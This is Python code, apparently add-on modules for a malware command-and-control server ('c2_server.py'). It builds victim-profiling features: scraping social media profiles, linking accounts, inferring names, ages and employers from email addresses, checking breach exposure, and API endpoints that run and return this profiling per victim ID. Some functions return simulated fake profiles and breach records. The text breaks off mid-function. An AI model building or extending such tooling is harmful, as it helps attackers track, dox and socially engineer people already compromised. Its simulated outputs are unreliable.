# Part 1: Social Media Integration & OSINT Data Collection
# Add these imports to the top of your c2_server.py

import requests
import re
from urllib.parse import urlparse
import hashlib
from bs4 import BeautifulSoup
import asyncio
import aiohttp
from concurrent.futures import ThreadPoolExecutor

import phonenumbers
from phonenumbers import geocoder, carrier, timezone
import dns.resolver
import whois
from email_validator import validate_email, EmailNotValidError
import hashlib
import base64
from datetime import datetime, timedelta

import base64
import io
from PIL import Image
import wave
import struct
from datetime import datetime
import threading
import queue

import speech_recognition as sr
from pydub import AudioSegment
import whisper
import threading
from datetime import datetime, timedelta
import hashlib

# Add these database schema updates to init_db() function
def init_enhanced_db_part1():
    """Enhanced database schema for OSINT features"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # OSINT data table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS osint_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                data_type TEXT,
                platform TEXT,
                profile_url TEXT,
                username TEXT,
                display_name TEXT,
                bio TEXT,
                followers_count INTEGER,
                following_count INTEGER,
                posts_count INTEGER,
                profile_image_url TEXT,
                location TEXT,
                verified BOOLEAN,
                created_date TEXT,
                last_post_date TEXT,
                email_found TEXT,
                phone_found TEXT,
                additional_data TEXT,
                confidence_score REAL,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Email enrichment table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS email_enrichment (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                email_address TEXT,
                email_provider TEXT,
                disposable_email BOOLEAN,
                deliverable BOOLEAN,
                social_platforms TEXT,
                breach_count INTEGER,
                breach_data TEXT,
                hibp_found BOOLEAN,
                first_name TEXT,
                last_name TEXT,
                full_name TEXT,
                location TEXT,
                employer TEXT,
                job_title TEXT,
                linkedin_url TEXT,
                twitter_url TEXT,
                facebook_url TEXT,
                confidence_score REAL,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        conn.commit()
        conn.close()
        log_activity("✅ Enhanced OSINT database schema initialized")
        return True
        
    except Exception as e:
        log_activity(f"❌ OSINT database initialization failed: {e}")
        return False

class OSINTCollector:
    """OSINT data collection and social media intelligence"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
    async def collect_victim_osint(self, victim_id, email=None, phone=None, username=None):
        """Main OSINT collection coordinator"""
        try:
            log_activity(f"🔍 Starting OSINT collection for victim {victim_id[:12]}...")
            
            results = {
                'social_media': [],
                'email_intel': {},
                'phone_intel': {},
                'usernames': [],
                'related_accounts': []
            }
            
            # Email-based OSINT
            if email:
                results['email_intel'] = await self.email_osint(victim_id, email)
                results['social_media'].extend(await self.find_social_by_email(email))
            
            # Phone-based OSINT
            if phone:
                results['phone_intel'] = await self.phone_osint(victim_id, phone)
                results['social_media'].extend(await self.find_social_by_phone(phone))
            
            # Username-based OSINT
            if username:
                results['social_media'].extend(await self.username_osint(username))
            
            # Cross-platform correlation
            results['related_accounts'] = await self.correlate_accounts(results['social_media'])
            
            # Store results
            await self.store_osint_results(victim_id, results)
            
            log_activity(f"✅ OSINT collection completed for {victim_id[:12]}")
            return results
            
        except Exception as e:
            log_activity(f"❌ OSINT collection error: {e}")
            return {}
    
    async def email_osint(self, victim_id, email):
        """Comprehensive email intelligence gathering"""
        try:
            intel = {
                'email': email,
                'provider': email.split('@')[1] if '@' in email else '',
                'disposable': False,
                'deliverable': False,
                'breaches': [],
                'social_accounts': [],
                'personal_info': {}
            }
            
            # Check if disposable email
            intel['disposable'] = await self.check_disposable_email(email)
            
            # Email deliverability check
            intel['deliverable'] = await self.check_email_deliverable(email)
            
            # Check data breaches (simulated - use real API in production)
            intel['breaches'] = await self.check_email_breaches(email)
            
            # Extract potential personal info from email
            intel['personal_info'] = self.extract_personal_info_from_email(email)
            
            # Search for email on social platforms
            intel['social_accounts'] = await self.search_email_social_platforms(email)
            
            # Store in database
            self.store_email_enrichment(victim_id, intel)
            
            return intel
            
        except Exception as e:
            log_activity(f"❌ Email OSINT error: {e}")
            return {}
    
    async def find_social_by_email(self, email):
        """Find social media accounts by email"""
        platforms = []
        
        try:
            # Simulated social media searches (replace with real API calls)
            search_platforms = [
                {'name': 'LinkedIn', 'search_url': f'https://linkedin.com/search/people?keywords={email}'},
                {'name': 'Twitter', 'search_url': f'https://twitter.com/search?q={email}'},
                {'name': 'Facebook', 'search_url': f'https://facebook.com/search/people?q={email}'},
                {'name': 'Instagram', 'search_url': f'https://instagram.com/{email.split("@")[0]}'},
                {'name': 'GitHub', 'search_url': f'https://github.com/search?q={email}'},
                {'name': 'Reddit', 'search_url': f'https://reddit.com/search?q={email}'}
            ]
            
            for platform in search_platforms:
                try:
                    # In production, use proper API calls
                    result = await self.search_platform(platform['name'], email)
                    if result:
                        platforms.append(result)
                except:
                    continue
            
            return platforms
            
        except Exception as e:
            log_activity(f"❌ Social media search error: {e}")
            return []
    
    async def search_platform(self, platform_name, identifier):
        """Search specific platform for identifier"""
        try:
            # Simulated platform search - replace with real implementation
            fake_profiles = {
                'LinkedIn': {
                    'platform': 'LinkedIn',
                    'username': identifier.split('@')[0],
                    'profile_url': f'https://linkedin.com/in/{identifier.split("@")[0]}',
                    'display_name': f'{identifier.split("@")[0].title()} User',
                    'bio': 'Professional at Company XYZ',
                    'followers': 150,
                    'verified': False,
                    'location': 'Unknown',
                    'confidence': 0.7
                },
                'Twitter': {
                    'platform': 'Twitter',
                    'username': f'@{identifier.split("@")[0]}',
                    'profile_url': f'https://twitter.com/{identifier.split("@")[0]}',
                    'display_name': f'{identifier.split("@")[0]} 🐦',
                    'bio': 'Just another Twitter user',
                    'followers': 89,
                    'verified': False,
                    'location': 'Internet',
                    'confidence': 0.6
                }
            }
            
            # Return simulated data (replace with real API calls)
            return fake_profiles.get(platform_name)
            
        except Exception as e:
            log_activity(f"❌ Platform search error for {platform_name}: {e}")
            return None
    
    async def username_osint(self, username):
        """Search for username across multiple platforms"""
        platforms = []
        
        try:
            # Common social media platforms to check
            platform_urls = {
                'Twitter': f'https://twitter.com/{username}',
                'Instagram': f'https://instagram.com/{username}',
                'GitHub': f'https://github.com/{username}',
                'Reddit': f'https://reddit.com/u/{username}',
                'TikTok': f'https://tiktok.com/@{username}',
                'YouTube': f'https://youtube.com/c/{username}',
                'Facebook': f'https://facebook.com/{username}',
                'LinkedIn': f'https://linkedin.com/in/{username}',
                'Snapchat': f'https://snapchat.com/add/{username}',
                'Pinterest': f'https://pinterest.com/{username}',
                'Telegram': f'https://t.me/{username}',
                'Discord': f'https://discord.com/users/{username}'
            }
            
            for platform, url in platform_urls.items():
                try:
                    exists = await self.check_username_exists(url)
                    if exists:
                        profile_data = await self.scrape_basic_profile(platform, url, username)
                        if profile_data:
                            platforms.append(profile_data)
                except:
                    continue
            
            return platforms
            
        except Exception as e:
            log_activity(f"❌ Username OSINT error: {e}")
            return []
    
    async def check_username_exists(self, url):
        """Check if username exists on platform"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=5) as response:
                    # Simple check - 200 status and not a "not found" page
                    if response.status == 200:
                        text = await response.text()
                        # Check for common "not found" indicators
                        not_found_indicators = [
                            'user not found', 'page not found', '404', 'does not exist',
                            'profile not found', 'account suspended', 'user suspended'
                        ]
                        return not any(indicator in text.lower() for indicator in not_found_indicators)
                    return False
        except:
            return False
    
    async def scrape_basic_profile(self, platform, url, username):
        """Scrape basic profile information"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=10) as response:
                    if response.status == 200:
                        html = await response.text()
                        soup = BeautifulSoup(html, 'html.parser')
                        
                        # Extract basic info (simplified)
                        profile = {
                            'platform': platform,
                            'username': username,
                            'profile_url': url,
                            'display_name': self.extract_display_name(soup, platform),
                            'bio': self.extract_bio(soup, platform),
                            'followers': self.extract_follower_count(soup, platform),
                            'verified': self.check_verified_status(soup, platform),
                            'profile_image': self.extract_profile_image(soup, platform),
                            'confidence': 0.8
                        }
                        
                        return profile
            return None
            
        except Exception as e:
            log_activity(f"❌ Profile scraping error for {platform}: {e}")
            return None
    
    def extract_display_name(self, soup, platform):
        """Extract display name from profile"""
        selectors = {
            'Twitter': ['[data-testid="UserName"]', '.ProfileHeaderCard-name'],
            'Instagram': ['h2', '.rhpdm'],
            'GitHub': ['.p-name', '.vcard-fullname'],
            'LinkedIn': ['h1', '.top-card-layout__title']
        }
        
        for selector in selectors.get(platform, ['h1', 'h2', '.name']):
            try:
                element = soup.select_one(selector)
                if element:
                    return element.get_text().strip()
            except:
                continue
        
        return 'Unknown'
    
    def extract_bio(self, soup, platform):
        """Extract bio/description from profile"""
        selectors = {
            'Twitter': ['[data-testid="UserDescription"]'],
            'Instagram': ['.-vDIg span'],
            'GitHub': ['.p-note'],
            'LinkedIn': ['.top-card-layout__headline']
        }
        
        for selector in selectors.get(platform, ['.bio', '.description']):
            try:
                element = soup.select_one(selector)
                if element:
                    return element.get_text().strip()
            except:
                continue
        
        return ''
    
    def extract_follower_count(self, soup, platform):
        """Extract follower count"""
        try:
            # Look for numbers that might be follower counts
            text = soup.get_text()
            numbers = re.findall(r'(\d+(?:,\d+)*)\s*(?:followers?|following)', text, re.IGNORECASE)
            if numbers:
                return int(numbers[0].replace(',', ''))
        except:
            pass
        return 0
    
    def check_verified_status(self, soup, platform):
        """Check if account is verified"""
        verified_indicators = [
            'verified', 'checkmark', 'blue-tick', 'badge',
            '✓', '✔', '☑', 'official'
        ]
        
        try:
            html_text = soup.get_text().lower()
            return any(indicator in html_text for indicator in verified_indicators)
        except:
            return False
    
    def extract_profile_image(self, soup, platform):
        """Extract profile image URL"""
        img_selectors = ['img[alt*="profile"]', 'img[alt*="avatar"]', '.avatar img', '.profile-img']
        
        for selector in img_selectors:
            try:
                img = soup.select_one(selector)
                if img and img.get('src'):
                    return img['src']
            except:
                continue
        
        return ''
    
    async def correlate_accounts(self, social_accounts):
        """Find correlations between social media accounts"""
        correlations = []
        
        try:
            # Group accounts by similar usernames
            username_groups = {}
            for account in social_accounts:
                username = account.get('username', '').lower()
                base_username = re.sub(r'[@_.-]', '', username)
                
                if base_username not in username_groups:
                    username_groups[base_username] = []
                username_groups[base_username].append(account)
            
            # Find groups with multiple platforms
            for base_username, accounts in username_groups.items():
                if len(accounts) > 1:
                    correlations.append({
                        'type': 'username_similarity',
                        'accounts': accounts,
                        'confidence': 0.9,
                        'description': f'Multiple accounts with similar username: {base_username}'
                    })
            
            # Look for display name similarities
            display_name_groups = {}
            for account in social_accounts:
                display_name = account.get('display_name', '').lower()
                if display_name and len(display_name) > 3:
                    if display_name not in display_name_groups:
                        display_name_groups[display_name] = []
                    display_name_groups[display_name].append(account)
            
            for display_name, accounts in display_name_groups.items():
                if len(accounts) > 1:
                    correlations.append({
                        'type': 'display_name_match',
                        'accounts': accounts,
                        'confidence': 0.8,
                        'description': f'Accounts with same display name: {display_name}'
                    })
            
            return correlations
            
        except Exception as e:
            log_activity(f"❌ Account correlation error: {e}")
            return []
    
    async def store_osint_results(self, victim_id, results):
        """Store OSINT results in database"""
        try:
            conn = sqlite3.connect(DATABASE)
            cursor = conn.cursor()
            
            # Store social media profiles
            for profile in results.get('social_media', []):
                cursor.execute('''
                    INSERT INTO osint_data 
                    (victim_id, data_type, platform, profile_url, username, display_name, 
                     bio, followers_count, verified, additional_data, confidence_score)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    victim_id, 'social_profile', profile.get('platform'),
                    profile.get('profile_url'), profile.get('username'),
                    profile.get('display_name'), profile.get('bio'),
                    profile.get('followers', 0), profile.get('verified', False),
                    json.dumps(profile), profile.get('confidence', 0.5)
                ))
            
            # Store correlations
            for correlation in results.get('related_accounts', []):
                cursor.execute('''
                    INSERT INTO osint_data 
                    (victim_id, data_type, platform, additional_data, confidence_score)
                    VALUES (?, ?, ?, ?, ?)
                ''', (
                    victim_id, 'account_correlation', 'multiple',
                    json.dumps(correlation), correlation.get('confidence', 0.5)
                ))
            
            conn.commit()
            conn.close()
            
            log_activity(f"💾 OSINT results stored for victim {victim_id[:12]}")
            
        except Exception as e:
            log_activity(f"❌ Error storing OSINT results: {e}")
    
    def store_email_enrichment(self, victim_id, intel):
        """Store email enrichment data"""
        try:
            conn = sqlite3.connect(DATABASE)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO email_enrichment 
                (victim_id, email_address, email_provider, disposable_email, 
                 deliverable, breach_count, breach_data, additional_data)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                victim_id, intel.get('email'), intel.get('provider'),
                intel.get('disposable', False), intel.get('deliverable', False),
                len(intel.get('breaches', [])), json.dumps(intel.get('breaches', [])),
                json.dumps(intel)
            ))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            log_activity(f"❌ Error storing email enrichment: {e}")
    
    # Helper methods for email analysis
    async def check_disposable_email(self, email):
        """Check if email is from disposable email service"""
        disposable_domains = [
            '10minutemail.com', 'tempmail.org', 'guerrillamail.com',
            'mailinator.com', 'throwaway.email', 'temp-mail.org'
        ]
        domain = email.split('@')[1] if '@' in email else ''
        return domain.lower() in disposable_domains
    
    async def check_email_deliverable(self, email):
        """Check if email address is deliverable"""
        # Simplified check - in production use email validation API
        return '@' in email and '.' in email.split('@')[1]
    
    async def check_email_breaches(self, email):
        """Check if email appears in data breaches"""
        # Simulated breach data - integrate with HaveIBeenPwned API
        return [
            {'breach': 'Example Breach 2023', 'date': '2023-01-15', 'data_types': ['email', 'password']},
            {'breach': 'Another Leak 2022', 'date': '2022-08-03', 'data_types': ['email', 'name']}
        ]
    
    def extract_personal_info_from_email(self, email):
        """Extract potential personal information from email structure"""
        username = email.split('@')[0]
        info = {}
        
        # Try to extract names from email patterns
        if '.' in username:
            parts = username.split('.')
            if len(parts) == 2:
                info['possible_first_name'] = parts[0].title()
                info['possible_last_name'] = parts[1].title()
        
        # Check for year patterns (birth year, graduation year)
        years = re.findall(r'(19|20)\d{2}', username)
        if years:
            info['possible_years'] = years
        
        # Check for number patterns
        numbers = re.findall(r'\d+', username)
        if numbers:
            info['numbers_in_email'] = numbers
        
        return info
    
    async def search_email_social_platforms(self, email):
        """Search for email on social platforms"""
        # This would integrate with social media APIs
        # For now, return simulated results
        return [
            {'platform': 'LinkedIn', 'found': True, 'url': f'https://linkedin.com/search?email={email}'},
            {'platform': 'Facebook', 'found': False, 'url': None}
        ]

# API endpoints for OSINT features
@app.route('/api/start-osint/<victim_id>', methods=['POST'])
def api_start_osint(victim_id):
    """Start OSINT collection for a victim"""
    try:
        data = request.get_json() or {}
        email = data.get('email')
        phone = data.get('phone')
        username = data.get('username')
        
        # Start OSINT collection in background
        osint_collector = OSINTCollector()
        
        # Use thread pool for async execution
        def run_osint():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            return loop.run_until_complete(
                osint_collector.collect_victim_osint(victim_id, email, phone, username)
            )
        
        executor = ThreadPoolExecutor(max_workers=1)
        future = executor.submit(run_osint)
        
        log_activity(f"🔍 OSINT collection started for victim {victim_id[:12]}")
        
        return jsonify({
            'status': 'started',
            'message': 'OSINT collection initiated',
            'victim_id': victim_id
        })
        
    except Exception as e:
        log_activity(f"❌ Error starting OSINT: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/osint-results/<victim_id>')
def api_osint_results(victim_id):
    """Get OSINT results for a victim"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Get OSINT data
        cursor.execute('''
            SELECT * FROM osint_data 
            WHERE victim_id = ? 
            ORDER BY timestamp DESC
        ''', (victim_id,))
        osint_data = cursor.fetchall()
        
        # Get email enrichment data
        cursor.execute('''
            SELECT * FROM email_enrichment 
            WHERE victim_id = ? 
            ORDER BY timestamp DESC
        ''', (victim_id,))
        email_data = cursor.fetchall()
        
        conn.close()
        
        return jsonify({
            'victim_id': victim_id,
            'osint_profiles': [dict(zip([col[0] for col in cursor.description], row)) for row in osint_data],
            'email_enrichment': [dict(zip([col[0] for col in cursor.description], row)) for row in email_data]
        })
        
    except Exception as e:
        log_activity(f"❌ Error getting OSINT results: {e}")
        return jsonify({'error': str(e)}), 500
    
    

 # Part 2: Email/Phone Enrichment & Enhanced Data Collection
 # Add these to your existing c2_server.py




# Enhanced database schema for Part 2
def init_enhanced_db_part2():
    """Enhanced database schema for email/phone enrichment"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Phone enrichment table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS phone_enrichment (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                phone_number TEXT,
                formatted_number TEXT,
                country_code TEXT,
                country_name TEXT,
                region TEXT,
                carrier TEXT,
                line_type TEXT,
                timezone TEXT,
                is_valid BOOLEAN,
                is_possible BOOLEAN,
                risk_score REAL,
                social_platforms TEXT,
                additional_data TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Domain intelligence table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS domain_intelligence (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                domain TEXT,
                registrar TEXT,
                creation_date TEXT,
                expiration_date TEXT,
                name_servers TEXT,
                whois_data TEXT,
                mx_records TEXT,
                subdomain_count INTEGER,
                reputation_score REAL,
                threat_indicators TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Contact correlation table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS contact_correlation (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                correlation_type TEXT,
                primary_identifier TEXT,
                secondary_identifier TEXT,
                relationship_type TEXT,
                confidence_score REAL,
                evidence TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        conn.commit()
        conn.close()
        log_activity("✅ Enhanced enrichment database schema initialized")
        return True
        
    except Exception as e:
        log_activity(f"❌ Enrichment database initialization failed: {e}")
        return False

class ContactEnrichment:
    """Advanced email and phone number enrichment"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    async def enrich_contact_info(self, victim_id, email=None, phone=None):
        """Main contact enrichment coordinator"""
        try:
            log_activity(f"📧 Starting contact enrichment for victim {victim_id[:12]}...")
            
            results = {
                'email_data': {},
                'phone_data': {},
                'domain_intel': {},
                'correlations': [],
                'risk_assessment': {}
            }
            
            # Email enrichment
            if email:
                results['email_data'] = await self.deep_email_analysis(victim_id, email)
                results['domain_intel'] = await self.analyze_email_domain(victim_id, email)
            
            # Phone enrichment
            if phone:
                results['phone_data'] = await self.deep_phone_analysis(victim_id, phone)
            
            # Cross-reference analysis
            if email and phone:
                results['correlations'] = await self.correlate_contact_info(victim_id, email, phone)
            
            # Risk assessment
            results['risk_assessment'] = self.calculate_risk_score(results)
            
            # Store enriched data
            await self.store_enrichment_results(victim_id, results)
            
            log_activity(f"✅ Contact enrichment completed for {victim_id[:12]}")
            return results
            
        except Exception as e:
            log_activity(f"❌ Contact enrichment error: {e}")
            return {}
    
    async def deep_email_analysis(self, victim_id, email):
        """Comprehensive email analysis and intelligence"""
        try:
            analysis = {
                'email': email,
                'validation': {},
                'provider_info': {},
                'security_analysis': {},
                'reputation': {},
                'patterns': {},
                'related_domains': [],
                'professional_info': {}
            }
            
            # Email validation and syntax analysis
            analysis['validation'] = await self.validate_email_comprehensive(email)
            
            # Provider and domain analysis
            analysis['provider_info'] = await self.analyze_email_provider(email)
            
            # Security analysis
            analysis['security_analysis'] = await self.email_security_analysis(email)
            
            # Pattern analysis for personal info extraction
            analysis['patterns'] = self.analyze_email_patterns(email)
            
            # Professional email detection
            analysis['professional_info'] = await self.detect_professional_email(email)
            
            # Related domain discovery
            analysis['related_domains'] = await self.find_related_domains(email)
            
            return analysis
            
        except Exception as e:
            log_activity(f"❌ Email analysis error: {e}")
            return {}
    
    async def validate_email_comprehensive(self, email):
        """Comprehensive email validation"""
        validation = {
            'is_valid': False,
            'is_deliverable': False,
            'is_disposable': False,
            'is_role_based': False,
            'mx_valid': False,
            'smtp_valid': False,
            'typo_suggestions': []
        }
        
        try:
            # Basic syntax validation
            valid = validate_email(email)
            validation['is_valid'] = True
            validation['normalized'] = valid.email
            
                 # Check for disposable email providers
            validation['is_disposable'] = await self.check_disposable_email_advanced(email)
            
            # Check for role-based emails
            validation['is_role_based'] = self.check_role_based_email(email)
            
            # MX record validation
            validation['mx_valid'] = await self.validate_mx_records(email)
            
            # SMTP validation (simulated)
            validation['smtp_valid'] = await self.validate_smtp_delivery(email)
            
            # Typo detection and suggestions
            validation['typo_suggestions'] = self.detect_email_typos(email)
            
        except EmailNotValidError as e:
            validation['error'] = str(e)
            validation['typo_suggestions'] = self.detect_email_typos(email)
        
        return validation
    
    async def check_disposable_email_advanced(self, email):
        """Advanced disposable email detection"""
        disposable_domains = [
            '10minutemail.com', 'tempmail.org', 'guerrillamail.com', 'mailinator.com',
            'throwaway.email', 'temp-mail.org', 'getnada.com', 'maildrop.cc',
            'yopmail.com', 'sharklasers.com', '33mail.com', 'mintemail.com'
        ]
        
        domain = email.split('@')[1].lower() if '@' in email else ''
        
        # Check against known disposable domains
        if domain in disposable_domains:
            return True
        
        # Check for suspicious patterns
        suspicious_patterns = [
            r'\d{5,}',  # Many numbers
            r'temp|throw|fake|spam|trash|junk',  # Suspicious keywords
            r'^[a-z]{1,3}\d+\.',  # Short prefix with numbers
        ]
        
        for pattern in suspicious_patterns:
            if re.search(pattern, domain):
                return True
        
        return False
    
    def check_role_based_email(self, email):
        """Check if email is role-based (not personal)"""
        username = email.split('@')[0].lower()
        role_based_prefixes = [
            'admin', 'support', 'info', 'contact', 'sales', 'marketing',
            'noreply', 'no-reply', 'help', 'service', 'team', 'office',
            'hr', 'recruiting', 'billing', 'accounts', 'legal'
        ]
        
        return any(prefix in username for prefix in role_based_prefixes)
    
    async def validate_mx_records(self, email):
        """Validate MX records for email domain"""
        try:
            domain = email.split('@')[1]
            mx_records = dns.resolver.resolve(domain, 'MX')
            return len(mx_records) > 0
        except:
            return False
    
    async def validate_smtp_delivery(self, email):
        """Simulate SMTP delivery validation"""
        # In production, implement actual SMTP check
        domain = email.split('@')[1].lower()
        
        # Known good domains
        trusted_domains = [
            'gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com',
            'icloud.com', 'protonmail.com', 'aol.com'
        ]
        
        return domain in trusted_domains
    
    def detect_email_typos(self, email):
        """Detect common email typos and suggest corrections"""
        suggestions = []
        
        common_typos = {
            'gmial.com': 'gmail.com',
            'gmai.com': 'gmail.com',
            'yahooo.com': 'yahoo.com',
            'hotmial.com': 'hotmail.com',
            'outlok.com': 'outlook.com'
        }
        
        domain = email.split('@')[1] if '@' in email else ''
        
        if domain in common_typos:
            corrected_email = email.replace(domain, common_typos[domain])
            suggestions.append(corrected_email)
        
        return suggestions
    
    async def analyze_email_provider(self, email):
        """Analyze email provider and domain information"""
        provider_info = {
            'domain': '',
            'provider_name': '',
            'provider_type': '',
            'country': '',
            'security_features': [],
            'reputation_score': 0.5
        }
        
        try:
            domain = email.split('@')[1].lower()
            provider_info['domain'] = domain
            
            # Known provider mapping
            provider_mapping = {
                'gmail.com': {'name': 'Google Gmail', 'type': 'Free', 'country': 'US', 'reputation': 0.9},
                'yahoo.com': {'name': 'Yahoo Mail', 'type': 'Free', 'country': 'US', 'reputation': 0.7},
                'hotmail.com': {'name': 'Microsoft Hotmail', 'type': 'Free', 'country': 'US', 'reputation': 0.8},
                'outlook.com': {'name': 'Microsoft Outlook', 'type': 'Free', 'country': 'US', 'reputation': 0.9},
                'icloud.com': {'name': 'Apple iCloud', 'type': 'Free', 'country': 'US', 'reputation': 0.9},
                'protonmail.com': {'name': 'ProtonMail', 'type': 'Secure', 'country': 'CH', 'reputation': 0.95}
            }
            
            if domain in provider_mapping:
                info = provider_mapping[domain]
                provider_info.update(info)
            else:
                # Analyze custom domain
                provider_info['provider_type'] = 'Custom Domain'
                provider_info['reputation_score'] = 0.6
                
                # Try to get WHOIS information
                try:
                    domain_whois = whois.whois(domain)
                    if domain_whois.country:
                        provider_info['country'] = domain_whois.country
                    provider_info['creation_date'] = str(domain_whois.creation_date) if domain_whois.creation_date else None
                except:
                    pass
            
            return provider_info
            
        except Exception as e:
            log_activity(f"❌ Provider analysis error: {e}")
            return provider_info
    
    async def email_security_analysis(self, email):
        """Analyze email security indicators"""
        security = {
            'has_plus_addressing': False,
            'suspicious_patterns': [],
            'entropy_score': 0.0,
            'dictionary_words': 0,
            'number_patterns': [],
            'special_chars': 0
        }
        
        try:
            username = email.split('@')[0]
            
            # Check for plus addressing (email+tag@domain.com)
            security['has_plus_addressing'] = '+' in username
            
            # Calculate entropy (randomness)
            security['entropy_score'] = self.calculate_string_entropy(username)
            
            # Count dictionary words
            security['dictionary_words'] = self.count_dictionary_words(username)
            
            # Find number patterns
            security['number_patterns'] = re.findall(r'\d+', username)
            
            # Count special characters
            security['special_chars'] = len(re.findall(r'[^a-zA-Z0-9]', username))
            
            # Check for suspicious patterns
            suspicious_checks = [
                ('multiple_dots', '\.{2,}' in username),
                ('all_numbers', username.isdigit()),
                ('very_long', len(username) > 30),
                ('very_short', len(username) < 3),
                ('random_chars', security['entropy_score'] > 4.0 and security['dictionary_words'] == 0)
            ]
            
            security['suspicious_patterns'] = [check[0] for check in suspicious_checks if check[1]]
            
            return security
            
        except Exception as e:
            log_activity(f"❌ Security analysis error: {e}")
            return security
    
    def calculate_string_entropy(self, text):
        """Calculate Shannon entropy of a string"""
        import math
        from collections import Counter
        
        if not text:
            return 0
        
        counts = Counter(text)
        length = len(text)
        
        entropy = 0
        for count in counts.values():
            p = count / length
            entropy += p * math.log2(p)
        
        return -entropy
    
    def count_dictionary_words(self, text):
        """Count dictionary words in text (simplified)"""
        common_words = [
            'admin', 'user', 'test', 'john', 'jane', 'smith', 'email',
            'info', 'contact', 'support', 'mail', 'web', 'site'
        ]
        
        text_lower = text.lower()
        return sum(1 for word in common_words if word in text_lower)
    
    def analyze_email_patterns(self, email):
        """Analyze patterns in email for personal information"""
        patterns = {
            'name_patterns': [],
            'date_patterns': [],
            'location_patterns': [],
            'organization_patterns': [],
            'personal_indicators': []
        }
        
        try:
            username = email.split('@')[0].lower()
            domain = email.split('@')[1].lower()
            
            # Name patterns
            if '.' in username:
                parts = username.split('.')
                if len(parts) == 2 and all(part.isalpha() for part in parts):
                    patterns['name_patterns'].append({
                        'type': 'first_last',
                        'first_name': parts[0].title(),
                        'last_name': parts[1].title()
                    })
            
            # Date patterns (birth year, graduation year, etc.)
            years = re.findall(r'(19|20)\d{2}', username)
            for year in years:
                current_year = datetime.now().year
                year_int = int(year)
                if 1950 <= year_int <= current_year:
                    age_estimate = current_year - year_int
                    if 10 <= age_estimate <= 80:  # Reasonable age range
                        patterns['date_patterns'].append({
                            'year': year_int,
                            'estimated_age': age_estimate,
                            'context': 'possible_birth_year' if age_estimate < 70 else 'possible_graduation_year'
                        })
            
            # Organization patterns
            if domain not in ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com']:
                patterns['organization_patterns'].append({
                    'domain': domain,
                    'type': 'corporate_email',
                    'organization': domain.replace('.com', '').replace('.org', '').title()
                })
            
            # Personal indicators
            personal_indicators = ['personal', 'private', 'home', 'family']
            for indicator in personal_indicators:
                if indicator in username:
                    patterns['personal_indicators'].append(indicator)
            
            return patterns
            
        except Exception as e:
            log_activity(f"❌ Pattern analysis error: {e}")
            return patterns
    
    async def detect_professional_email(self, email):
        """Detect if email appears to be professional/corporate"""
        professional_info = {
            'is_professional': False,
            'confidence': 0.0,
            'indicators': [],
            'company_name': '',
            'industry_guess': ''
        }
        
        try:
            username = email.split('@')[0].lower()
            domain = email.split('@')[1].lower()
            
            # Check for professional indicators
            professional_indicators = []
            
            # Corporate domain (not free email)
            free_providers = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'icloud.com']
            if domain not in free_providers:
                professional_indicators.append('corporate_domain')
                professional_info['company_name'] = domain.replace('.com', '').replace('.org', '').title()
            
            # Professional username patterns
            if '.' in username and len(username.split('.')) == 2:
                professional_indicators.append('name_format')
            
            # Business-related keywords in domain
            business_keywords = ['corp', 'inc', 'llc', 'ltd', 'company', 'group', 'solutions', 'systems']
            if any(keyword in domain for keyword in business_keywords):
                professional_indicators.append('business_keywords')
            
            # Calculate confidence
            professional_info['is_professional'] = len(professional_indicators) >= 2
            professional_info['confidence'] = min(len(professional_indicators) * 0.3, 1.0)
            professional_info['indicators'] = professional_indicators
            
            return professional_info
            
        except Exception as e:
            log_activity(f"❌ Professional detection error: {e}")
            return professional_info
    
    async def find_related_domains(self, email):
        """Find domains related to the email domain"""
        related_domains = []
        
        try:
            domain = email.split('@')[1]
            base_domain = domain.replace('www.', '')
            
            # Common subdomain variations
            common_subdomains = ['www', 'mail', 'webmail', 'smtp', 'pop', 'imap', 'mx']
            
            for subdomain in common_subdomains:
                related_domain = f"{subdomain}.{base_domain}"
                # In production, check if these domains actually exist
                related_domains.append({
                    'domain': related_domain,
                    'type': 'subdomain',
                    'purpose': subdomain
                })
            
            return related_domains
            
        except Exception as e:
            log_activity(f"❌ Related domains error: {e}")
            return related_domains
    
    async def deep_phone_analysis(self, victim_id, phone):
